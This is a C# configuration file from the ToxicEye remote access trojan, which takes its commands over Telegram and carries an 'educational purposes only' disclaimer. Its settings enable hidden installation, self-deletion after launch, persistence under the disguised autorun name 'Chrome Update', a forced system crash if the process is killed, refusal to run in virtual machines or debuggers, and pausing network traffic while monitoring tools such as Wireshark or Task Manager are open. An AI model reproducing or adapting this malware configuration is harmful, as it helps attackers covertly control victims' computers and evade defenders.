/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https:github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = true;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = true;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "netstat", "netmon", "filemon", "regmon", "cain", "tcpview", "wireshark"
        };
        // Start delay (in seconds).
        public static int StartDelay = 1;
    }
}
